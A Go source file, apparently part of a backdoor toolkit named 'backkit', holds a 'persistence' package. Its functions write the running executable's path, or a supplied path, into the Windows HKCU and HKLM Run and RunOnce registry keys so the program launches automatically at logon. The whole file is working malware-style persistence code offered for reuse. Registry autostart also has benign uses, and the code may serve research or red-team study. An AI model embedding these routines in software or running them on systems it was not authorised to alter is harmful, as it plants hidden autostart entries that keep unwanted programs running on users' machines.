package persistence

import (
	"errors"

	"golang.org/x/sys/windows/registry"

	"github.com/iIIusi0n/backkit/utils"
)

func AddStartupUsingHkcuRun(args ...string) error {
	switch len(args) {
	case 1:
		return addCurrentFileToStartupUsingHkcuRun(args[0])
	case 2:
		return addExternalFileToStartupUsingHkcuRun(args[0], args[1])
	default:
		return errors.New("wrong args passed")
	}
}

func addExternalFileToStartupUsingHkcuRun(name, path string) error {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return err
	}
	if err := key.SetStringValue(name, path); err != nil {
		return err
	}
	if err := key.Close(); err != nil {
		return err
	}
	return nil
}

func addCurrentFileToStartupUsingHkcuRun(name string) error {
	currentPath, err := utils.GetCurrentPath()
	if err != nil {
		return err
	}
	return addExternalFileToStartupUsingHkcuRun(name, currentPath)
}

func AddStartupUsingHkcuRunOnce(args ...string) error {
	switch len(args) {
	case 1:
		return addCurrentFileToStartupUsingHkcuRunOnce(args[0])
	case 2:
		return addExternalFileToStartupUsingHkcuRunOnce(args[0], args[1])
	default:
		return errors.New("wrong args passed")
	}
}

func addExternalFileToStartupUsingHkcuRunOnce(name, path string) error {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\RunOnce`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return err
	}
	if err := key.SetStringValue(name, path); err != nil {
		return err
	}
	if err := key.Close(); err != nil {
		return err
	}
	return nil
}

func addCurrentFileToStartupUsingHkcuRunOnce(name string) error {
	currentPath, err := utils.GetCurrentPath()
	if err != nil {
		return err
	}
	return addExternalFileToStartupUsingHkcuRunOnce(name, currentPath)
}

func AddStartupUsingHklmRun(args ...string) error {
	switch len(args) {
	case 1:
		return addCurrentFileToStartupUsingHklmRun(args[0])
	case 2:
		return addExternalFileToStartupUsingHklmRun(args[0], args[1])
	default:
		return errors.New("wrong args passed")
	}
}

func addExternalFileToStartupUsingHklmRun(name, path string) error {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return err
	}
	if err := key.SetStringValue(name, path); err != nil {
		return err
	}
	if err := key.Close(); err != nil {
		return err
	}
	return nil
}

func addCurrentFileToStartupUsingHklmRun(name string) error {
	currentPath, err := utils.GetCurrentPath()
	if err != nil {
		return err
	}
	return addExternalFileToStartupUsingHklmRun(name, currentPath)
}

func AddStartupUsingHklmRunOnce(args ...string) error {
	switch len(args) {
	case 1:
		return addCurrentFileToStartupUsingHklmRunOnce(args[0])
	case 2:
		return addExternalFileToStartupUsingHklmRunOnce(args[0], args[1])
	default:
		return errors.New("wrong args passed")
	}
}

func addExternalFileToStartupUsingHklmRunOnce(name, path string) error {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\RunOnce`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return err
	}
	if err := key.SetStringValue(name, path); err != nil {
		return err
	}
	if err := key.Close(); err != nil {
		return err
	}
	return nil
}

func addCurrentFileToStartupUsingHklmRunOnce(name string) error {
	currentPath, err := utils.GetCurrentPath()
	if err != nil {
		return err
	}
	return addExternalFileToStartupUsingHklmRunOnce(name, currentPath)
}
